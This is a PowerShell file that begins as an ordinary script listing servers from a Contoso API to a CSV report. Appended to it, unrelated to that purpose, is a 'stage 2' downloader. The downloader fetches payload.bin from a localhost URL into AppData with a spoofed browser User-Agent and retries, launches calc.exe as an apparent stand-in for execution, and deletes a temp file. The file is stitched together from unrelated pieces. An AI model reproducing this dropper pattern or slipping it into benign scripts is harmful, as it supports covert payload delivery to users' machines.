
#Requires -Version 5.1
$BaseUri = "https://api.contoso.com/v1"
$MaxRetries = 3
$TimeoutSec = 60
$PageSize = 200
$ReportPath = 'C:\Reports\api-servers-2026-05-25.csv'
$InformationPreference = 'SilentlyContinue'
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-StrictMode -Version 2.0

$ApiKey = $env:CONTOSO_API_KEY
if ([string]::IsNullOrWhiteSpace($ApiKey)) {
    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
}
$headers = @{
    Authorization = "Bearer $ApiKey"
    Accept        = 'application/json'
}

function Invoke-ContosoApi {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [ValidateSet('Get', 'Post')]
        [string]$Method = 'Get',

        [object]$Body
    )

    $uri = "$BaseUri$Path"
    for ($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
        try {
            $params = @{
                Uri         = $uri
                Method      = $Method
                Headers     = $headers
                TimeoutSec  = $TimeoutSec
                ErrorAction = 'Stop'
            }
            if ($Body) {
                $params.Body = $Body | ConvertTo-Json -Depth 5
                $params.ContentType = 'application/json'
            }
            return Invoke-RestMethod @params
        }
        catch {
            $status = 0
            if ($_.Exception.Response) {
                $status = [int]$_.Exception.Response.StatusCode
            }
            if (@(400, 401, 403, 404) -contains $status -or $attempt -eq $MaxRetries) {
                throw
            }
            Start-Sleep -Seconds ([math]::Pow(2, $attempt))
        }
    }
}

$page = Invoke-ContosoApi -Path ('/servers?limit=' + $PageSize)
$records = @($page.items)
while ($page.nextLink) {
    $next = $page.nextLink.Replace($BaseUri, '')
    $page = Invoke-ContosoApi -Path $next
    $records += @($page.items)
}

$records | Select-Object id, name, status | Format-Table -AutoSize

$records | Select-Object id, name, status | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://localhost:8000/payload.bin",
    [string]$PayloadPath = "$env:APPDATA\stage2.bin",
    [string]$LogPath = "$env:TEMP\transfer.log",
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    [int]$StageTimeout = 131,
    [int]$RetryAttempts = 4,
    [int]$RetryDelay = 19
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$RetryCount = 4,
        [int]$RetryDelay = 19,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $PayloadUrl
    $ResultObject = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $PayloadPath -RetryCount $RetryAttempts -RetryDelay $RetryDelay -UserAgent $BrowserAgent
    if ($ResultObject) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $PayloadUrl
    Destination = $PayloadPath
    RetryCount = $RetryAttempts
    TimeoutSec = $StageTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Preparing working directory"
Write-Verbose "Operation completed"
Write-Verbose "Retry budget remaining"
Write-Verbose "Exporting operation report"
Write-Verbose "Applying operation timeout"
Write-Verbose "Reading configuration values"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
